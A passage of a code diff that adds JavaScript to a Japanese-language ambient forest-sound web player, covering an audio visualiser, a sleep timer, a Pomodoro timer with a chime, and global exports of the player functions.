+                            if (x === 0) vCtx.moveTo(x, y);
+                            else vCtx.lineTo(x, y);
+                        }
+                        vCtx.stroke();
+                    }
+                    requestAnimationFrame(drawVis);
+                }
+                drawVis();
+            }
+
+            function switchTimerTab(tab) {
+                document.getElementById('tabBtn-sleep').className = tab === 'sleep' ? 'flex-1 py-1.5 rounded-lg font-bold bg-forest-600 text-white transition' : 'flex-1 py-1.5 rounded-lg font-bold text-gray-400 transition';
+                document.getElementById('tabBtn-pomo').className = tab === 'pomo' ? 'flex-1 py-1.5 rounded-lg font-bold bg-forest-600 text-white transition' : 'flex-1 py-1.5 rounded-lg font-bold text-gray-400 transition';
+                document.getElementById('timerTabContent-sleep').classList.toggle('hidden', tab !== 'sleep');
+                document.getElementById('timerTabContent-pomo').classList.toggle('hidden', tab !== 'pomo');
+            }
+
+            function startSleepTimer(minutes) {
+                if (sleepTimerId) clearInterval(sleepTimerId);
+                sleepEndTime = Date.now() + minutes * 60 * 1000;
+                sleepTimerId = setInterval(() => {
+                    const leftSec = Math.max(0, Math.floor((sleepEndTime - Date.now()) / 1000));
+                    const m = Math.floor(leftSec / 60);
+                    const s = leftSec % 60;
+                    document.getElementById('sleepTimerDisplay').innerText = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+                    if (leftSec <= 0) {
+                        clearInterval(sleepTimerId);
+                        if (isMasterPlaying) toggleMasterPlay();
+                        document.getElementById('sleepTimerDisplay').innerText = '--:--';
+                    }
+                }, 1000);
+            }
+
+            function cancelSleepTimer() {
+                if (sleepTimerId) clearInterval(sleepTimerId);
+                document.getElementById('sleepTimerDisplay').innerText = '--:--';
+            }
+
+            function togglePomodoro() {
+                pomoIsRunning = !pomoIsRunning;
+                const btn = document.getElementById('pomoStartBtn');
+                if (pomoIsRunning) {
+                    btn.innerText = '一時停止';
+                    btn.className = 'flex-1 py-2 rounded-xl bg-amber-500 hover:bg-amber-400 text-forest-950 font-bold text-xs transition shadow';
+                    pomoTimerId = setInterval(() => {
+                        pomoSecondsLeft--;
+                        updatePomoDisplay();
+                        if (pomoSecondsLeft <= 0) {
+                            pomoIsWorking = !pomoIsWorking;
+                            pomoSecondsLeft = pomoIsWorking ? 25 * 60 : 5 * 60;
+                            document.getElementById('pomoStateLabel').innerText = pomoIsWorking ? '作業タイム (25分)' : '休憩タイム (5分)';
+                            playChimeNotification();
+                        }
+                    }, 1000);
+                } else {
+                    btn.innerText = 'スタート';
+                    btn.className = 'flex-1 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs transition shadow';
+                    clearInterval(pomoTimerId);
+                }
+            }
+
+            function resetPomodoro() {
+                clearInterval(pomoTimerId);
+                pomoIsRunning = false;
+                pomoIsWorking = true;
+                pomoSecondsLeft = 25 * 60;
+                document.getElementById('pomoStartBtn').innerText = 'スタート';
+                document.getElementById('pomoStateLabel').innerText = '作業タイム (25分)';
+                updatePomoDisplay();
+            }
+
+            function updatePomoDisplay() {
+                const m = Math.floor(pomoSecondsLeft / 60);
+                const s = pomoSecondsLeft % 60;
+                document.getElementById('pomoTimerDisplay').innerText = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+            }
+
+            function playChimeNotification() {
+                if (!audioCtx) initAudioEngine();
+                const osc = audioCtx.createOscillator();
+                const g = audioCtx.createGain();
+                osc.frequency.value = 523.25;
+                g.gain.setValueAtTime(0.3, audioCtx.currentTime);
+                g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 1.5);
+                osc.connect(g);
+                g.connect(masterGainNode);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 1.6);
+            }
+
+            // 森の音プレイヤーの関数をグローバルに公開
+            window.initForestPlayer = initForestPlayer;
+            window.toggleMasterPlay = toggleMasterPlay;
+            window.updateChannelVolume = updateChannelVolume;
+            window.updateChannelPan = updateChannelPan;
+            window.updateMasterVolume = updateMasterVolume;
+            window.muteAllChannels = muteAllChannels;
+            window.setBinaural = setBinaural;
+            window.updateBinauralVolume = updateBinauralVolume;
+            window.applyPreset = applyPreset;
+            window.openSavePresetModal = openSavePresetModal;
+            window.closeSavePresetModal = closeSavePresetModal;
+            window.confirmSaveCustomPreset = confirmSaveCustomPreset;
+            window.applyCustomPreset = applyCustomPreset;
+            window.deleteCustomPreset = deleteCustomPreset;
+            window.setScene = setScene;
+            window.switchTimerTab = switchTimerTab;
+            window.startSleepTimer = startSleepTimer;
+            window.cancelSleepTimer = cancelSleepTimer;
+            window.togglePomodoro = togglePomodoro;
+            window.resetPomodoro = resetPomodoro;
+        })();
     </script>
 </body>
 </html>
